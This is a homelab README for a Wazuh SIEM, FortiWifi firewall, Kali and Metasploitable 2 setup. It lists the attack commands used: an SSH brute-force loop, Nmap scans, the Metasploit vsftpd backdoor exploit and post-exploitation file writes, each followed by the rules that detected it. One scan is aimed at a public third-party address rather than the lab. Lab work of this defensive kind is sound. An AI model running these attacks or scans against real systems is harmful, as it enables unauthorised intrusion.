# Cybersecurity Homelab — Wazuh SIEM/XDR with Attack Detection

A fully functional cybersecurity homelab built to simulate real-world attack and defense scenarios. This lab demonstrates hands-on experience with SIEM deployment, endpoint monitoring, offensive security, automated incident response, network perimeter monitoring, and attack detection mapped to the MITRE ATT&CK framework.

---

## Lab Overview

This homelab replicates a small enterprise environment with a firewall, a SIEM server, an attacker machine, and a vulnerable target. All virtual machines run on VMware Workstation Pro hosted on a Lenovo ThinkBook, connected through a FortiWifi 71G firewall.

---

## Technologies Used

| Component | Technology |
|---|---|
| SIEM / XDR | Wazuh 4.x |
| Firewall / Router | Fortinet FortiWifi 71G |
| Host Machine | Lenovo ThinkBook |
| Hypervisor | VMware Workstation Pro |
| SIEM Server OS | Ubuntu Server 24.04.4 LTS |
| Attacker VM | Kali Linux |
| Target VM | Metasploitable 2 (Ubuntu 8.04, Kernel 2.6.24) |

---

## Network Diagram

```
                        Internet
                           |
                   FortiWifi 71G
                (Firewall / Router / IPS)
                           |
                     10.1.1.x LAN
                           |
          Lenovo ThinkBook (VMware Workstation Pro)
          ├── Wazuh Server       10.1.1.3  (Ubuntu 24.04)
          ├── Kali Linux         10.1.1.8  (Attacker VM)
          └── Metasploitable 2   10.1.1.5  (Target VM)
```

---

## What Was Built

### 1. Wazuh SIEM/XDR Server
- Deployed Wazuh all-in-one stack on Ubuntu Server 24.04.4 LTS inside VMware
- Components installed: Wazuh Manager, Wazuh Indexer (OpenSearch), Wazuh Dashboard, Filebeat
- Configured static IP at `10.1.1.3` for reliable agent connectivity
- Web dashboard accessible at `https://10.1.1.3`

### 2. Network Infrastructure & FortiWifi Integration
- FortiWifi 71G configured as network perimeter firewall, DHCP server, and IPS
- All VMs bridged to physical LAN on the `10.1.1.x` subnet
- Two subnets in use: `10.1.1.x` (LAN/homelab) and `192.168.40.x` (WiFi management)
- FortiWifi syslog forwarded to Wazuh on UDP port 514
- Wazuh automatically parsing FortiGate logs using built-in `fortigate-firewall-v6` decoder
- FortiWifi IPS configured to block port scanning attacks

### 3. Kali Linux Attacker VM
- Imported pre-built Kali VMware image
- Wazuh agent installed and enrolled (amd64)
- Used as attack platform for all offensive security exercises

### 4. Metasploitable 2 Target VM
- Imported Metasploitable 2 `.vmdk` into VMware
- Intentionally vulnerable Linux machine used as attack target
- Wazuh agent installed with legacy compatibility workarounds (see setup guide)
- SSH auth log monitoring configured for attack detection

---

## Attacks Performed & Detections

### 1. SSH Brute Force Attack
**Tool:** SSH loop from Kali  
**Command:**
```bash
for i in {1..20}; do ssh -o "KexAlgorithms=diffie-hellman-group1-sha1" -o "HostKeyAlgorithms=ssh-rsa" -o "MACs=hmac-sha1" wronguser@10.1.1.5; done
```
**Wazuh Detections:**
- Rule 5710 (level 5) — SSH attempt using non-existent user
- Rule 5712 (level 10) — SSH brute force detected
- Rule 651 — Host blocked by firewall-drop Active Response
- **Kali's IP automatically blocked by Wazuh Active Response**

---

### 2. Network Reconnaissance (Nmap)
**Tool:** Nmap on Kali  
**Command:**
```bash
nmap -A -sV -O 10.1.1.5
```
**Wazuh Detections:**
- Rule 2551 (level 10) — Possible network scan detected
- Rule 5706 (level 6) — sshd insecure connection attempt
- Rule 31101 — Web server 400 errors from scan
- Rule 5602 — Telnet connection attempt detected
- Rule 11401 — FTP session detected

---

### 3. Metasploit vsftpd 2.3.4 Backdoor Exploit
**Tool:** Metasploit Framework on Kali  
**Commands:**
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.1.1.5
set LHOST 10.1.1.8
run
```
**Result:** Meterpreter session opened with root access on Metasploitable  
**Post-exploitation:** Shell access, user creation, file system access  
**Wazuh Detections:**
- Rule 11401 — vsftpd FTP session opened
- Rule 533 (level 7) — New port opened (backdoor spawned)
- Rule 510 (level 7) — Host-based anomaly detection
- Rule 5902 (level 8) — New user added to the system
- Rule 5901 (level 8) — New group added to the system
- Rule 5904 (level 8) — User information changed

---

### 4. Post-Exploitation File Activity
**Tool:** Meterpreter shell  
**Commands run on Metasploitable:**
```bash
touch /tmp/hacked_by_kali
touch /tmp/fim_test
echo "test" > /root/test
```
**Wazuh Detections (File Integrity Monitoring):**
- `/root/test` — file added in root directory
- `/tmp/fim_test` — file added in /tmp
- `/tmp/fim_test2` — file added in /tmp
- `/tmp/test_file` — file added in /tmp
- `/etc/unreal/ircd.tune` — config file modification detected
- All activity attributed to `root` user

---

### 5. Network Port Scan — FortiWifi IPS Detection & Blocking
**Tool:** Nmap on Kali  
**Command:**
```bash
nmap -sS -p 1-1000 8.8.8.8
```
**FortiWifi IPS Detections:**
- Rule 81628 (level 11) — Fortigate attack detected (initial scan)
- Rule 81629 (level 6) — Fortigate attack dropped (after IPS block configured)
- Rule 81612 (level 3) — Fortigate firewall configuration change logged
- **6 packets dropped by FortiWifi IPS in real time**
- **Dual-layer detection** — same attack caught by both Wazuh endpoint agent and FortiWifi IPS

---

## Wazuh Features Configured & Demonstrated

### Security Events & Alerting
- Real time security event monitoring across all agents
- 90+ events captured during attack simulation sessions
- Alert severity levels from informational (3) to critical (11)

### MITRE ATT&CK Mapping
Wazuh automatically mapped detected activity to the following tactics:

| Tactic | Events | Example |
|---|---|---|
| Credential Access | 3 | Failed SSH authentication attempts |
| Initial Access | 6 | SSH login attempts from Kali |
| Defense Evasion | 11 | System anomaly patterns |
| Privilege Escalation | 10 | PAM authentication events |
| Persistence | 6 | Service and daemon activity |

### File Integrity Monitoring (FIM)
- Configured monitoring of `/etc/passwd`, `/etc/shadow`, `/tmp`, `/root`, `/bin`
- Successfully detected all files created via Meterpreter post-exploitation
- Detected unauthorized config file modification automatically
- Attributed all changes to root user with timestamps

### Vulnerability Detection
- Enabled Wazuh vulnerability scanner on the manager
- CVEs detected on Kali Linux agent — Metasploitable agent incompatible due to legacy kernel 2.6.24
- Scanner running on 60 minute feed update interval

### Active Response
- Configured `firewall-drop` active response triggered by rule 5712
- Successfully demonstrated automatic IP blocking on brute force detection
- 180 second block timeout with automatic unblock
- Complete attack → detect → respond cycle demonstrated end to end

### Network Perimeter Monitoring (FortiWifi Syslog)
- FortiWifi 71G syslog forwarded to Wazuh on UDP port 514
- Wazuh automatically parsing logs using built-in `fortigate-firewall-v6` decoder
- Every firewall connection logged with full application layer details
- FortiWifi IPS configured to block Port.Scanning attacks
- Firewall configuration changes automatically logged by Wazuh
- Compliance frameworks auto-mapped: PCI DSS, GDPR, HIPAA, NIST-800-53

### Compliance Monitoring (CIS Benchmarks)
- Wazuh automatically ran CIS benchmark scans against all agents
- Kali Linux: 45% score against CIS Distribution Independent Linux Benchmark v2.0.0
- 190 total checks run automatically with pass/fail/not applicable results

---

## Key Challenges & Solutions

| Challenge | Solution |
|---|---|
| Wazuh install failing mid-way | Expanded VM disk to 100GB, fully cleaned broken install, reinstalled |
| Metasploitable SSL error on agent download | Used HTTP instead of HTTPS for legacy OS compatibility |
| Metasploitable architecture mismatch (amd64) | Downloaded i386 package for 32-bit system |
| Wazuh 4.14 agent failing on kernel 2.6.24 | Downgraded to Wazuh 4.3.0 for legacy kernel compatibility |
| No systemctl on Ubuntu 8.04 | Used `/var/ossec/bin/wazuh-control` instead |
| SSH key algorithm mismatch with Metasploitable | Used legacy KexAlgorithms, HostKeyAlgorithms, and MACs flags |
| FIM not showing results | Manually triggered scan with `agent_control -r -u 002` on Wazuh server |
| Vulnerability detection tag deprecated | Updated from `vulnerability-detector` to `vulnerability-detection` |
| FortiWifi IPS detecting but not blocking | Switched firewall policy from `all_default_pass` to blocking IPS profile |

---

## Setup Guides

- [Wazuh Server Installation](setup/wazuh-install.md)
- [Kali Linux Agent Setup](setup/kali-setup.md)
- [Metasploitable 2 Agent Setup](setup/metasploitable-setup.md)
- [FortiWifi Syslog Integration](setup/fortiwifi-syslog-integration.md)

---

## Attack Documentation

- [SSH Brute Force](attacks/ssh-brute-force.md)
- [Network Reconnaissance (Nmap)](attacks/nmap-reconnaissance.md)
- [Metasploit vsftpd Backdoor Exploit](attacks/metasploit-vsftpd.md)
- [File Integrity Monitoring](attacks/file-integrity-monitoring.md)

---

## Skills Demonstrated

- SIEM deployment and configuration (Wazuh)
- Endpoint agent installation and management
- Network architecture with enterprise firewall (FortiWifi)
- Firewall syslog integration and log parsing
- Intrusion Prevention System (IPS) configuration
- Offensive security — reconnaissance, exploitation, post-exploitation
- Defensive security — alert tuning, FIM, active response, IPS blocking
- MITRE ATT&CK framework mapping
- Automated incident response
- Compliance monitoring (CIS, PCI DSS, GDPR, HIPAA, NIST-800-53)
- Linux system administration (Ubuntu, Kali, legacy Ubuntu 8.04)
- Legacy system troubleshooting and compatibility
- Virtualization with VMware Workstation Pro

---

## Future Improvements

- [x] FortiWifi syslog forwarding to Wazuh for firewall event monitoring
- [x] FortiWifi IPS blocking of detected attacks
- [ ] Custom Wazuh detection rules targeting Meterpreter sessions
- [ ] Email or Slack alerts for critical severity events
- [ ] Add Windows VM as additional monitored endpoint
- [ ] Hydra brute force with full credential stuffing demonstration
- [ ] Document additional Metasploit exploits (Samba, IRC, Java RMI)

---

## References

- [Wazuh Documentation](https://documentation.wazuh.com)
- [Metasploitable 2 Guide](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [MITRE ATT&CK Framework](https://attack.mitre.org)
- [Kali Linux](https://www.kali.org)
- [Fortinet Documentation](https://docs.fortinet.com)
